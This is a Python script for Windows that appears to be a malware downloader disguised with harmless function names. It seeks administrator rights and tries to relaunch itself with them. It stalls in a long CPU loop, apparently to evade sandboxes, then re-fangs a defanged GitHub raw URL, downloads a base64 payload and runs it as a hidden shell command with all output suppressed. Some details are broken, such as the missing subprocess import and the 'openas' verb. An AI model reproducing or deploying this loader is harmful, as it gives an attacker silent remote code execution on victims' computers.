import ctypes
import urllib.request
import time
import base64
import sys
import os

def system_check():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def fetch_data():
    resource_path = "hxxps://raw[.]githubusercontent[.]com/PrivateJoker55/SECRET/refs/heads/main/Idk[.]txt"
    clean_url = resource_path.replace("hxxps", "https").replace("[.]", ".")
    
    try:
        with urllib.request.urlopen(clean_url) as response:
            return response.read().decode('utf-8')
    except:
        return None

def background_calculation():
    total = 0
    for current in range(1, 900000001):
        total += current % 3
        if current % 15000000 == 0:
            time.sleep(0.015)
    return total > 0

def run_command(instruction):
    try:
        decoded = base64.b64decode(instruction).decode('utf-16le')
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        subprocess.run(
            decoded,
            shell=True,
            startupinfo=startupinfo,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        return True
    except:
        return False

def main_operation():
    if not system_check():
        ctypes.windll.shell32.ShellExecuteW(
            None, "openas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()
    
    if background_calculation():
        config_data = fetch_data()
        if config_data:
            run_command(config_data)

if __name__ == "__main__":
    main_operation()